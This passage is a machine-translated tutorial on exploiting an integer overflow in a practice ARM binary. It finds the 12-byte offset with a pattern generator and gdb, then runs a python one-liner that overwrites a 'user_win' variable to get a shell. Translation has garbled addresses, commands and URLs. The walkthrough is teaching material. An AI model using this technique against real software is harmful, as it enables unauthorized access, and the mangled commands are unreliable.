href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">缓冲区溢出模式生成器</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">使用此工具，您可以生成一个由独特模式组成的字符串，您可以使用它来替换序列的A的…</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">wiremask.eu</p></div></div></div></a></div><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nt"><img src="../Images/20ee3f3fa97044f24e733171a66311ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iuS3WtTTACHyePGv-3ferA.png"/></div></div></figure><p id="4ab4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们使用gdb运行二进制文件并输入它，同时不要忘记将断点放在CMP指令处。</p><blockquote class="ks kt ku"><p id="f18a" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">GEF &gt; b * 0x 00010600<br/>0x 10600处的断点3</p><p id="51e9" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">GEF &gt; r aa 0 aa 1 aa 2 aa 3 aa 4 aa 5a a6 aa 7 aa 8 aa 9 ab 0 ab 1 ab 2 ab 3 ab 4 ab 5 ab 6 ab 7 ab 8 ab 9 AC 0 AC 1 AC 3 AC 5 AC 6 AC 7 AC 8 AC 9 ad 0 ad 1 ad 2 ad 3 ad 4 ad 5 ad 6 ad 7 ad 8 ad 9 a E0 AE 1 AE 2 AE 3 AE 4 AE 5 AE 6 AE 7 AE 8 AE 9 af 0 a f1 af 3 af 4 a F5 af 6 af 7 af 8 a F9 ag 0 ag 1 ag 2 ag 3 ag 45 ag 6 ag 7 ag 8 ag 9 ag 9 ag 9 a。</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nu"><img src="../Images/98631a4d997789f99b794506af6162d2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PCYZqwx3wc6NFgBFR9jbvQ.png"/></div></div></figure><p id="439f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">断点已命中。现在检查r3的值</p><p id="3cf6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将该值复制到模式生成器中，以找到偏移量。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nv"><img src="../Images/9044f83fedeeb3485c74510c6a7e923d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xAe1CCZUupio9DXlk8q6Dg.png"/></div></div></figure><p id="ce39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们找到了偏移量。第12个字符之后的字符将覆盖user_win变量。所以我们应该在输入的12个字符后加上4个B(“BBBB”)来覆盖user_win，从而得到我们的精彩shell。</p><p id="b896" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以漏洞会是这样的</p><blockquote class="ks kt ku"><p id="4a0c" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">pi @ raspberrypi:~/ASM/integer overflow $。/integer overflow $(python-c ' print " A " * 12+" BBBB "+A *(261–12–4)')</p></blockquote><p id="f7e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以最后的关键时刻…让我们运行漏洞</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nw"><img src="../Images/6c7ff20980e90034c63cc2531af6217f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lybjxa5DmoTf1mO0jhXG7w.png"/></div></div></figure><p id="a67d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">万岁！！！！！！！！！！！！！！！！！！！！！！！</strong></p><p id="10de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们得到了我们的壳……:)</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="nx kr l"/></div></figure><p id="de2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它用“BBBB”覆盖了user_win变量的值，给了我们一个shell。</p></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><p id="0b3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以现在就这样了。我希望你喜欢这个。我尽量保持简短:p。</p><p id="2c01" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢它，请不要犹豫与他人分享，并感谢你花宝贵的时间阅读这篇文章:)</p><p id="b544" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想支持我，试试在Udemy上购买我的Arm开发课程:<a class="ae kz" href="https://www.udemy.com/course/reverse-engineering-and-binary-exploitation-in-arm/?referralCode=8C725D513E77420A0CBF" rel="noopener ugc nofollow" target="_blank">https://www . Udemy . com/course/reverse-engineering-and-binary-Exploitation-in-Arm/？referral code = 8c 725d 513 e 77420 a 0 CBF</a></p></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><p id="3093" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参考</strong>:<a class="ae kz" href="https://sploitfun.wordpress.com/2015/06/23/integer-overflow/" rel="noopener ugc nofollow" target="_blank">https://sploitfun . WordPress . com/2015/06/23/integer-overflow/</a></p></div><div class="ab cl ny nz hu oa" role="separator"><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od oe"/><span class="ob bw bk oc od"/></div><div class="ij ik il im in"><p id="fe6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如有任何疑问，请联系我:</p><p id="5264" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">insta gram:<a class="ae kz" href="https://www.instagram.com/hagane_no_rekinjutsushi/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/hagane_no_rekinjutsushi/</a></p><p id="1275" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://www.facebook.com/i.am.ultralegend脸书<a class="ae kz" href="https://www.facebook.com/i.am.ultralegend" rel="noopener ugc nofollow" target="_blank"/></p></div></div>    
</body>
</html>